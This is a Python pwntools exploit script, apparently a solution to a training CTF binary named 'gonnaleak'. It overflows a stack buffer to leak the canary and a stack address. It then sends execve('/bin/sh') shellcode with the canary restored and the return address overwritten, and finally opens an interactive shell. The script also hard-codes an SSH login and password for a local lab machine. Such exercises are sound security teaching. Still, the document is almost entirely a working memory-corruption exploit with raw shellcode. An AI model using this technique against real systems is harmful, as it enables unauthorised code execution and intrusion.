from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    ssh = ssh("buba98", "127.0.0.1", password="Vinsent22!", port=2222)
    r = ssh.process("gonnaleak")
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2011)

input("Overflow stack variable to leak canary")

stackstuff = b"B"*105
r.send(stackstuff)
r.recvuntil(b"> ")
r.recv(105)

canary = u64(b"\x00" + r.recv(7))
print("canary: %#x" % canary)

input("Leak pointer close to main stack frame")

# 0x7fffffffe9b8 + 8 is the start of my buffer
# 0x7fffffffeb18 is what is present on the stack and is located 2 blocks under RIP

delta = 0x7fffffffe9b8 + 8 - 0x7fffffffeb18

stackstuff = b"C"*104  # here we are at the canary
stackstuff += b"C"*8  # here we overrided the canary
stackstuff += b"C"*8  # here we overrided the RBP
stackstuff += b"C"*8  # here we overrided the RIP
stackstuff += b"C"*8  # here we overrided the stuff under RIP and we are now ready to leak

r.send(stackstuff)
r.recvuntil(b"> ")
r.recv(136)
stackpointer = u64(r.recv(6) + b"\x00\x00")
print("stackpointer: %#x" % stackpointer)

input("Override return address and reinsert canary while uploading the shellcode")

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

stackstuff = shellcode.ljust(104, b"\x90") + \
    p64(canary) + b"D" * 8 + p64(stackpointer + delta)
r.send(stackstuff)

r.interactive()
